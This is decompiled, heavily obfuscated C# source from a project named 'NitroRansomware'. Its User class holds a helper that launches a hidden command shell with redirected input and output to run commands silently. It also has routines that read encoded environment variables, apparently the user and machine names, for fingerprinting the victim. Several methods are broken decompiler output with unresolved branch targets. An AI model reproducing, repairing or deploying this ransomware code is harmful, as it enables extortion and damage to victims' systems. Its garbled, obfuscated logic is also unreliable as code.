using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace NitroRansomware;

internal class User
{
	private class Cmd : IDisposable
	{
		private Process cmdProcess;

		private StreamWriter sw;

		private AutoResetEvent outputWaitHandle;

		private string cmdOutput;

		public unsafe Cmd(string cmdPath)
		{
			cmdProcess = new Process();
			int num = _003CModule_003E.dccdcddukdkdccdcuuddkccdudcckd();
			int num2 = _003CModule_003E.kkkkckkcdckkkukkuukcckcdcukccc();
			if ((_003CModule_003E.cuukdddkduccuuudcudccdkduddcdd() ^ _003CModule_003E.kukckuuddkcuucdkcdkcccukkucduk()) == _003CModule_003E.kuckuuccckccddddkdduudcccukkcc())
			{
				num = _003CModule_003E.kdcukukudcukcdkduukkcudkckcdud();
				num2 += sizeof(float);
			}
			outputWaitHandle = new AutoResetEvent((byte)(num2 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09)) != 0);
			cmdOutput = string.Empty;
			ProcessStartInfo processStartInfo = new ProcessStartInfo
			{
				FileName = cmdPath
			};
			int num3 = _003CModule_003E.ucddkukkucuckudcuccukckkdcdkcd();
			int num4 = _003CModule_003E.cckduckcdudckdukuckkudukdccudu();
			if ((_003CModule_003E.uddddcckdckkuuuuckuddcdcccudkk() ^ _003CModule_003E.kuckddukdkuccddccdckkkkkdcducc()) == _003CModule_003E.uukdkuucddkkcccckkcdkdckkkcccu())
			{
				num3 = _003CModule_003E.dkduudcuukdkdudduuuckdkccdkkuk();
				num4 += sizeof(float);
			}
			processStartInfo.UseShellExecute = (byte)(num4 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09)) != 0;
			int num5 = _003CModule_003E.kkdcdkcddukcuckkddkkcddkckdcku();
			int num6 = _003CModule_003E.dkkcdukuuuudukkdcucckkdcuccddd();
			if ((_003CModule_003E.ckucudckuukkccuckddudkkduucudu() ^ _003CModule_003E.kkuucuccccckkucddudkkcdckkdudd()) == _003CModule_003E.udkkcdcuddkdcukukcuuduuucukcuc())
			{
				num5 = _003CModule_003E.uuuuuukkccucukkkkccukukkkdkuuu();
				num6 += sizeof(float);
			}
			processStartInfo.RedirectStandardOutput = (byte)(num6 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09)) != 0;
			int num7 = _003CModule_003E.ukdukccdkcudkkkukuukudkdcduccu();
			int num8 = _003CModule_003E.ucuudccddudkcdkkudkcucdckukkkc();
			if ((_003CModule_003E.dkccdkcccukkdkccukdkcdkdkkucuk() ^ _003CModule_003E.ckduuudddkdkcucuuddukdcddkkccd()) == _003CModule_003E.ckdckdcccduucuccccucudckkudduu())
			{
				num7 = _003CModule_003E.ucukudkkcckkckdccuuuduudkuudku();
				num8 += sizeof(float);
			}
			processStartInfo.RedirectStandardInput = (byte)(num8 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09)) != 0;
			int num9 = _003CModule_003E.kuudccdkkckkdccccckukckkdduddd();
			int num10 = _003CModule_003E.ccddkuccucccckcuukcdkkuccucukc();
			if ((_003CModule_003E.ukckkdcdkdkkudcdkdukkcckdkucuu() ^ _003CModule_003E.kdkcdcdkkucddudkcdkucuddckukcd()) == _003CModule_003E.kdcudkdckkdddkdccucdudckkudkku())
			{
				num9 = _003CModule_003E.uudkuuccdukkdkuuudkddkduckckck();
				num10 += sizeof(float);
			}
			processStartInfo.CreateNoWindow = (byte)(num10 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09)) != 0;
			cmdProcess.OutputDataReceived += CmdProcess_OutputDataReceived;
			cmdProcess.StartInfo = processStartInfo;
			cmdProcess.Start();
			sw = cmdProcess.StandardInput;
			cmdProcess.BeginOutputReadLine();
		}

		public void Dispose()
		{
			cmdProcess.Close();
			cmdProcess.Dispose();
			sw.Close();
			sw.Dispose();
		}

		public string ExecuteCommand(string command)
		{
			cmdOutput = string.Empty;
			sw.WriteLine(command);
			sw.WriteLine("echo end");
			outputWaitHandle.WaitOne();
			return cmdOutput;
		}

		private unsafe void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			int num;
			if (e.Data != null)
			{
				num = ((e.Data == "end") ? 1 : 0);
			}
			else
			{
				int num2 = _003CModule_003E.cuccckdducdkdduukccuddkkdudcdc();
				int num3 = _003CModule_003E.kkkukuucuuudcdddkkkukkduccukud();
				if ((_003CModule_003E.cudccudkudduuddduckdcukkkdcccu() ^ _003CModule_003E.kcuukddkccdkckuccddudkkuuucdkc()) == _003CModule_003E.ccdkdukkudduddkkkkcucuuuudcdku())
				{
					num2 = _003CModule_003E.ckdkkccckkcckducckuccccukudkcd();
					num3 += sizeof(float);
				}
				num = num3 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09);
			}
			if (num != 0)
			{
				outputWaitHandle.Set();
			}
			else
			{
				cmdOutput = cmdOutput + e.Data + Environment.NewLine;
			}
		}
	}

	private static Logs cdkkkkuuudcudukccudcducdudcukuukucucucudcukkdkcckduuuudducucdck;

	public static string ucdcdkkuuukcuuukkducudkkkkucdcckdudddkckdccududdcddukduuucucdddkcuucd()
	{
		//Discarded unreachable code: IL_001b, IL_0039, IL_005a, IL_0078, IL_0434, IL_0443
		_003CModule_003E.uuckkdccdddccudduccucuuccuddck = _003CModule_003E.ccukduckkkccukukudukduuukdkckc() + _003CModule_003E.ckcdkcdudkkukccukdkkkkccddddkk() + _003CModule_003E.ckkuukkddkkkdcdcukcuuckdkkdddc();
		/*Error near IL_0016: Could not find block for branch target IL_03ec*/;
	}

	public unsafe static List<string> ckccdcuukuuuududukkdkduddddddukcuckckkdkuuucdcuucucuudkckkckukcuu()
	{
		//Discarded unreachable code: IL_00bc
		_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.dkcuduckkucukucukuucdddkkkkkkk() + _003CModule_003E.uckkucddkddkccddckcdkuuukkkcuu() + _003CModule_003E.ukkdkdukkkucudcuccckuduckducdc();
		do
		{
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.kukckddccdccdckdkdkuuddcduuddk() + _003CModule_003E.ckkuddkcduudkudckckkudkcdcddcc() + _003CModule_003E.kkukukccccudkuduuccuukduucduuu())
			{
				_003CModule_003E.dcudkududckkcdududddddducucdkc = new List<string>();
				_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.kkdccuckduddduudduucuccuddckuk() + _003CModule_003E.cduuccdukccccdudkkkuucdcdudcuc() + _003CModule_003E.kkudckkcckdkuckckukddckduddkdu();
			}
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.uukukkduccududucdukuukcuudkukc() + _003CModule_003E.ckcuccddkkcccukdukkkkkdkkucudc() + _003CModule_003E.dkcdkuckccudukkkducdcdckkkkcud())
			{
				_003CModule_003E.uuuducudkuuddcudkduuddukcdckuc = _003CModule_003E.dcudkududckkcdududddddducucdkc;
				_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.dcddkcdccucuuducuukduukkkkucdd() + _003CModule_003E.ukcuukdukdcccdcukuuduckdkkkdud() + _003CModule_003E.uuuudkkkccudukckccucddddcckccc();
			}
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.dkdkkudddkckckcuudcdddkckuduku() + _003CModule_003E.kdddccdckdcuuudduuuuukkcukdukc() + _003CModule_003E.dcukducuuddcduukkuukkcdckkuccc())
			{
				break;
			}
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.kukckukccdcdukdccudkddkkkckdkc() + _003CModule_003E.uuccccucdukkckdkuudcccckkcukkd() + _003CModule_003E.ckkdcdukuuuddcddudcduukukkckck())
			{
				_003CModule_003E.cdcuducukckuukkddckucucucdkuuu = _003CModule_003E.uuckkddcdduudkdcudccdudckukudc();
				int num = _003CModule_003E.uududduucdkkkccddduuccddkkdkdu();
				if ((_003CModule_003E.dkuccddkkdukuccuuudkdckkdkudud() ^ _003CModule_003E.kuuukduudckuudkcdcuccckduukucc()) == _003CModule_003E.ckucdkcdcckduckkukkukcckcduddc())
				{
					_003CModule_003E.cdcuducukckuukkddckucucucdkuuu = _003CModule_003E.ddkukkkckdkkdkkuuuuuddudkduudd();
					num += sizeof(float);
				}
				_003CModule_003E.ducucducukuuukcckcdckkddduudkk = Environment.GetEnvironmentVariable(_003CModule_003E.cckdukuuuduucuukkdkddduukkkcddudducukkcukdukudkuuduk("粚粼粪粽粁粮粢粪", num + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09)));
				_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.ucdducukckdckkckckdukdccudcccc() + _003CModule_003E.cuckcukdcdkuccduuuckccucdukucd() + _003CModule_003E.dcukdckkuddudducudukcddcdddkkd();
			}
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.cuuukudcccccdukduduckckcckukkk() + _003CModule_003E.cdkdukkkudccckuddccdkkcudkuckk() + _003CModule_003E.kukckcckdddckududduukcdckkucku())
			{
				_003CModule_003E.cukucukkdcccdkkdkkckudukuducuu = _003CModule_003E.udkuuuckdkudcckdkdukkuuukdducd();
				int num2 = _003CModule_003E.ddkcckccdkcdkudkduckkuddcdkcud();
				if ((_003CModule_003E.dudkkdddkdcudcucukudkkckukkkkc() ^ _003CModule_003E.dddkcdkkckcdccdudckdckuudukucd()) == _003CModule_003E.udddkuudkdcuuuukdkckcddkddkkcu())
				{
					_003CModule_003E.cukucukkdcccdkkdkkckudukuducuu = _003CModule_003E.ucuccudukkdkkcudckkuddcccddddc();
					num2 += sizeof(float);
				}
				_003CModule_003E.cuccududdukduukucddkucudcukddu = Environment.GetEnvironmentVariable(_003CModule_003E.cckdukuuuduucuukkdkddduukkkcddudducukkcukdukudkuuduk("\ue56b\ue567\ue565\ue578\ue57d\ue57c\ue56d\ue57a\ue566\ue569\ue565\ue56d", num2 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09)));
				_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.cucukkdkkkkkdkkcuuckckduuddcdu() + _003CModule_003E.ukuddkuukudkdkudkckkckuudkudkc() + _003CModule_003E.kucuckcdkddkudckkddduucdkucdku();
			}
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.uucuccdcuuckkkkkcdcudddkdukccu() + _003CModule_003E.uudcccukckcdkcuuccukkuucduukdd() + _003CModule_003E.kudddukuuducucckuuukkducukkuud())
			{
				_003CModule_003E.dcudkududckkcdududddddducucdkc.Add(_003CModule_003E.cuccududdukduukucddkucudcukddu);
				_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.uckcdudkudcuuuuukkdudkuudkducd() + _003CModule_003E.uukdckkkuukukddcckdddduddcducu() + _003CModule_003E.dkdukuudccudukuckudcddduddkkdd();
			}
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.kuuddddcdkdcucckccccccukdkccdc() + _003CModule_003E.ucdccdkucuuddduukukdcddcudkukd() + _003CModule_003E.uuuucuccdcdududucdukddkddduudu())
			{
				_003CModule_003E.dcudkududckkcdududddddducucdkc.Add(_003CModule_003E.ducucducukuuukcckcdckkddduudkk);
				_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.dcuukkkccdkdudkddkudckkdducudu() + _003CModule_003E.kdccccdcuuckcuddkkddkcddcucduc() + _003CModule_003E.uucddcuccudcukukdudkucdduukckd();
			}
			if (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk == _003CModule_003E.kkukddduuucddkkuddckdddudcuucc() + _003CModule_003E.ckcuuudckdccdkuucddddkkddkckcu() + _003CModule_003E.kkccccukucdcdcdududkdddcckdcuc())
			{
				_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk = _003CModule_003E.cukcukkudckckckucudccukkuccddk() + _003CModule_003E.ckukkkkcddccuukuuckddkuckuukdk() + _003CModule_003E.dkuukkukckckdkdddukddddkckccdu();
			}
		}
		while (_003CModule_003E.cdkuukdudcucdkcccdduduucccucdk != _003CModule_003E.ukcudcukuddckkcucuccudddcdcucd() + _003CModule_003E.uccdccukkukddkdcduuudddudukuck() + _003CModule_003E.kkducukkdkkkcukuddkddukukuuudu());
		return _003CModule_003E.uuuducudkuuddcudkduuddukcdckuc;
	}

	public static string cuuccdkcdkckudduduucukckddkkducckcukcdukuuukuukucukcuckkcddcdkkcuuck()
	{
		//Discarded unreachable code: IL_001b, IL_0039, IL_0068, IL_0086, IL_027b, IL_028a
		//IL_0139: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Expected O, but got Unknown
		_003CModule_003E.kuukkudcucckcukdkkddcuucddkckd = _003CModule_003E.kkdkckkcuccudccuckucuccckudkud() + _003CModule_003E.dcckkkcccdcukuucudkckckudducdd() + _003CModule_003E.cdudcdcdccckdudkkudddkkcuukdkc();
		/*Error near IL_0016: Could not find block for branch target IL_0233*/;
	}

	unsafe static User()
	{
		int num = _003CModule_003E.ucdccdckudcuuckcdkckukcccukukc();
		int num2 = _003CModule_003E.kukcukdcckcduucuckkdkkuududcdu();
		if ((_003CModule_003E.uudkdducukccucududdukkuckdduuk() ^ _003CModule_003E.kccduddcuckkckcuccdddkukccdudd()) == _003CModule_003E.kkucdkddudkckcukuudcucudckucck())
		{
			num = _003CModule_003E.dkcdckudkkucukdudcucdcuukucdkd();
			num2 += sizeof(float);
		}
		string uudkdcuccdukkuccccckcdudkccdcdducckckddckduucudkcudkk = _003CModule_003E.cckdukuuuduucuukkdkddduukkkcddudducukkcukdukudkuuduk("玝玜玛玌玞", num2 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09));
		int num3 = _003CModule_003E.cucudddkducucuukdudukcdkkuudud();
		int num4 = _003CModule_003E.dudcukkdkduuckdkkddkuudcdkdccc();
		if ((_003CModule_003E.cdukuddkkukdckdckukkuukukkdcuu() ^ _003CModule_003E.kucduukkckcddkddkdccdkkcudddku()) == _003CModule_003E.kucccccuukkdckuuuddkdddkddckku())
		{
			num3 = _003CModule_003E.dckukdcuuccukkkddkukkdddukucuc();
			num4 += sizeof(float);
		}
		cdkkkkuuudcudukccudcducdudcukuukucucucudcukkdkcckduuuudducucdck = new Logs(uudkdcuccdukkuccccckcdudkccdcdducckckddckduucudkcudkk, num4 + sizeof(bool) - (int)Math.Sin(Math.PI / 2.0) + sizeof(bool) - (int)Math.Cos(2.009864237645921E-09));
	}
}
